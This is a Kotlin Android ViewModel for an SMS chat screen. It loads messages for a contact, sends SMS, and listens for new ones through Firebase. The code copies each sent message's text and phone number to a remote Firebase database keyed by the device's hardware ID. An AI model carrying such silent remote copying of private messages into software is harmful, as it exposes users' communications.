package com.example.fast.viewmodel

import android.app.Application
import android.annotation.SuppressLint
import android.provider.Settings
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.viewModelScope
import com.example.fast.config.AppConfig
import com.example.fast.domain.usecase.SendSmsUseCase
import com.example.fast.model.ChatMessage
import com.example.fast.repository.SmsRepository
import com.example.fast.util.Logger
import com.example.fast.util.Result
import com.google.firebase.Firebase
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.Query
import com.google.firebase.database.database
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import javax.inject.Inject

/**
 * ViewModel for ChatActivity
 * Manages:
 * - Chat messages for a specific contact
 * - Sending messages
 * - Loading states
 */
@HiltViewModel
class ChatActivityViewModel @Inject constructor(
    application: Application,
    private val smsRepository: SmsRepository,
    private val sendSmsUseCase: SendSmsUseCase
) : AndroidViewModel(application) {
    
    private val context = getApplication<Application>()
    
    // LiveData for UI state
    private val _messages = MutableLiveData<List<ChatMessage>>()
    val messages: LiveData<List<ChatMessage>> = _messages
    
    private val _isEmpty = MutableLiveData<Boolean>()
    val isEmpty: LiveData<Boolean> = _isEmpty
    
    private val _isLoading = MutableLiveData<Boolean>()
    val isLoading: LiveData<Boolean> = _isLoading
    
    private val _sendMessageResult = MutableLiveData<SendMessageResult?>()
    val sendMessageResult: LiveData<SendMessageResult?> = _sendMessageResult
    
    // Contact information
    private var _contactNumber = MutableLiveData<String>()
    val contactNumber: LiveData<String> = _contactNumber
    
    private var _contactName = MutableLiveData<String>()
    val contactName: LiveData<String> = _contactName
    
    // Firebase listener for real-time message updates
    private var messageListener: ChildEventListener? = null
    
    // Track last message timestamp to only listen for NEW messages
    private var lastMessageTimestamp: Long = 0
    
    // Batch message updates to avoid UI spam
    private val pendingMessages = mutableListOf<ChatMessage>()
    private var batchUpdateJob: kotlinx.coroutines.Job? = null
    
    @get:SuppressLint("HardwareIds")
    private val androidId: String
        get() = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: ""
    
    /**
     * Result of sending a message
     */
    sealed class SendMessageResult {
        object Success : SendMessageResult()
        data class Error(val exception: Exception) : SendMessageResult()
    }
    
    /**
     * Initialize ViewModel with contact information
     */
    fun initialize(contactNumber: String, contactName: String) {
        _contactNumber.value = contactNumber
        _contactName.value = contactName
        
        // Load messages first, then setup Firebase listener
        // This ensures lastMessageTimestamp is set before listening to Firebase
        viewModelScope.launch {
            loadMessages()
            // Setup listener after messages are loaded
            setupFirebaseMessageListener()
        }
    }
    
    /**
     * Load messages synchronously (call from coroutine scope)
     */
    private suspend fun loadMessages() {
        val contactNum = _contactNumber.value ?: return
        _isLoading.value = true
        
        when (val result = smsRepository.getMessages(contactNum, limit = 1000)) {
            is Result.Success -> {
                val messagesList = result.data.filterIsInstance<ChatMessage>()
                
                // Sort by timestamp and update last message timestamp
                val sortedMessages = messagesList.sortedBy { it.timestamp }
                _messages.value = sortedMessages
                _isEmpty.value = sortedMessages.isEmpty()
                
                // Track the latest message timestamp to only listen for newer messages
                lastMessageTimestamp = sortedMessages.maxOfOrNull { it.timestamp } ?: 0
                
                _isLoading.value = false
                Logger.d("ChatActivityViewModel", "Loaded ${sortedMessages.size} messages, last timestamp: $lastMessageTimestamp")
            }
            is Result.Error -> {
                Logger.e("ChatActivityViewModel", result.exception, "Failed to load messages")
                _isEmpty.value = true
                _isLoading.value = false
            }
        }
    }
    
    /**
     * Setup Firebase real-time listener for NEW messages only
     * Only listens for messages newer than the last loaded message timestamp
     * This prevents slow broadcast when there are many old messages
     */
    private fun setupFirebaseMessageListener() {
        val contactNum = _contactNumber.value ?: return
        val messagesPath = AppConfig.getFirebaseMessagePath(androidId)
        val messagesRef = Firebase.database.reference.child(messagesPath)
        
        // Remove existing listener to prevent duplicates
        messageListener?.let {
            messagesRef.removeEventListener(it)
        }
        
        // Only listen for messages NEWER than the last loaded message
        // This prevents Firebase from broadcasting all old messages
        val query: Query = if (lastMessageTimestamp > 0) {
            // Query messages with timestamp greater than last loaded message
            // This filters out old messages and only gets new ones
            messagesRef.orderByKey().startAfter(lastMessageTimestamp.toString())
        } else {
            // If no messages loaded yet, limit to last 50 to avoid loading too many
            messagesRef.orderByKey().limitToLast(50)
        }
        
        messageListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                // Only process messages newer than what we've already loaded
                val messageTimestamp = snapshot.key?.toLongOrNull() ?: 0
                if (messageTimestamp > lastMessageTimestamp) {
                    handleMessageSnapshot(snapshot, contactNum, messageTimestamp)
                }
            }
            
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                val messageTimestamp = snapshot.key?.toLongOrNull() ?: 0
                if (messageTimestamp > lastMessageTimestamp) {
                    handleMessageSnapshot(snapshot, contactNum, messageTimestamp)
                }
            }
            
            override fun onChildRemoved(snapshot: DataSnapshot) {
                // Handle message removal if needed
            }
            
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {
                // Not needed for messages
            }
            
            override fun onCancelled(error: DatabaseError) {
                Logger.e("ChatActivityViewModel", error.toException(), "Firebase listener cancelled")
            }
        }
        
        query.addChildEventListener(messageListener!!)
        
        android.util.Log.d("ChatActivityViewModel", "Firebase listener setup - listening for messages after timestamp: $lastMessageTimestamp")
    }
    
    /**
     * Normalize phone number for comparison (remove spaces, dashes, parentheses)
     */
    private fun normalizePhoneNumber(phone: String): String {
        return phone.replace(Regex("[^0-9+]"), "")
    }
    
    /**
     * Handle Firebase message snapshot with batching
     * Parse message format: "type~phone~body"
     * Batches multiple messages together for efficient UI updates
     */
    private fun handleMessageSnapshot(snapshot: DataSnapshot, contactNumber: String, timestamp: Long) {
        try {
            val messageValue = snapshot.getValue(String::class.java) ?: return
            val parts = messageValue.split("~")
            
            if (parts.size < 3) return
            
            val type = parts[0] // "received" or "sent"
            val phone = parts[1]
            val body = parts.drop(2).joinToString("~") // Handle messages with ~ in body
            
            // Normalize phone numbers for comparison (remove formatting)
            val normalizedPhone = normalizePhoneNumber(phone)
            val normalizedContact = normalizePhoneNumber(contactNumber)
            
            // Only process messages for this contact
            if (normalizedPhone != normalizedContact) return
            
            val isReceived = type == "received"
            
            // Check if message already exists
            val currentMessages = _messages.value?.toMutableList() ?: mutableListOf()
            val messageExists = currentMessages.any { 
                it.id == snapshot.key && it.address == phone && it.body == body 
            }
            
            if (!messageExists) {
                val newMessage = ChatMessage(
                    id = snapshot.key ?: timestamp.toString(),
                    body = body,
                    timestamp = timestamp,
                    isReceived = isReceived,
                    address = phone
                )
                
                // Update last message timestamp
                if (timestamp > lastMessageTimestamp) {
                    lastMessageTimestamp = timestamp
                }
                
                // Batch message updates to avoid UI spam
                synchronized(pendingMessages) {
                    pendingMessages.add(newMessage)
                }
                
                // Schedule batched update (debounce - wait 200ms for more messages)
                batchUpdateJob?.cancel()
                batchUpdateJob = viewModelScope.launch {
                    kotlinx.coroutines.delay(200) // Wait 200ms for more messages
                    processBatchedMessages()
                }
                
                Logger.d("ChatActivityViewModel", "New message queued: $type from $phone (timestamp: $timestamp)")
            }
        } catch (e: Exception) {
            Logger.e("ChatActivityViewModel", e, "Error handling message snapshot")
        }
    }
    
    /**
     * Process batched messages and update UI efficiently
     * This prevents UI spam when many messages arrive at once
     */
    private fun processBatchedMessages() {
        synchronized(pendingMessages) {
            if (pendingMessages.isEmpty()) return
            
            val currentMessages = _messages.value?.toMutableList() ?: mutableListOf()
            
            // Add all pending messages at once
            pendingMessages.forEach { newMessage ->
                // Double-check for duplicates
                val exists = currentMessages.any { 
                    it.id == newMessage.id && it.address == newMessage.address && it.body == newMessage.body 
                }
                if (!exists) {
                    currentMessages.add(newMessage)
                }
            }
            
            // Sort by timestamp (oldest first for chat)
            val sortedMessages = currentMessages.sortedBy { it.timestamp }
            
            // Update UI once with all new messages
            _messages.value = sortedMessages
            _isEmpty.value = false
            
            val batchSize = pendingMessages.size
            pendingMessages.clear()
            
            Logger.d("ChatActivityViewModel", "Batched update: Added $batchSize messages")
        }
    }
    
    /**
     * Reload messages for the contact (public method for manual refresh)
     */
    fun reloadMessages() {
        viewModelScope.launch {
            loadMessages()
        }
    }
    
    /**
     * Send SMS message
     */
    fun sendMessage(messageText: String) {
        val contactNum = _contactNumber.value ?: return
        
        if (messageText.isBlank()) {
            return
        }
        
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val smsManager = android.telephony.SmsManager.getDefault()
                smsManager.sendTextMessage(contactNum, null, messageText, null, null)
                
                // Save to Firebase
                val timestamp = System.currentTimeMillis()
                val messagePath = AppConfig.getFirebaseMessagePath(androidId, timestamp)
                Firebase.database.reference.child(messagePath)
                    .setValue("sent~$contactNum~$messageText")
                
                // Add sent message to local list immediately for instant UI feedback
                val sentMessage = ChatMessage(
                    id = timestamp.toString(),
                    body = messageText,
                    timestamp = timestamp,
                    isReceived = false,
                    address = contactNum
                )
                
                // Update last message timestamp to prevent duplicate from Firebase listener
                if (timestamp > lastMessageTimestamp) {
                    lastMessageTimestamp = timestamp
                }
                
                // Update messages list on main thread
                withContext(Dispatchers.Main) {
                    val currentMessages = _messages.value?.toMutableList() ?: mutableListOf()
                    // Check for duplicate before adding
                    val exists = currentMessages.any { 
                        it.id == timestamp.toString() && it.address == contactNum && it.body == messageText 
                    }
                    if (!exists) {
                        currentMessages.add(sentMessage)
                        // Sort by timestamp (oldest first for chat)
                        val sortedMessages = currentMessages.sortedBy { it.timestamp }
                        _messages.value = sortedMessages
                    }
                    _isEmpty.value = false
                    _sendMessageResult.value = SendMessageResult.Success
                }
            } catch (e: Exception) {
                e.printStackTrace()
                withContext(Dispatchers.Main) {
                    _sendMessageResult.value = SendMessageResult.Error(e)
                }
            }
        }
    }
    
    /**
     * Clear send message result
     */
    fun clearSendMessageResult() {
        _sendMessageResult.value = null
    }
    
    /**
     * Cleanup Firebase listener and cancel batch jobs
     */
    override fun onCleared() {
        super.onCleared()
        
        // Cancel batch update job
        batchUpdateJob?.cancel()
        batchUpdateJob = null
        
        // Process any remaining batched messages
        processBatchedMessages()
        
        // Remove Firebase listener
        messageListener?.let {
            try {
                val messagesPath = AppConfig.getFirebaseMessagePath(androidId)
                Firebase.database.reference.child(messagesPath).removeEventListener(it)
            } catch (e: Exception) {
                Logger.e("ChatActivityViewModel", e, "Error removing Firebase listener")
            }
        }
        messageListener = null
    }
}
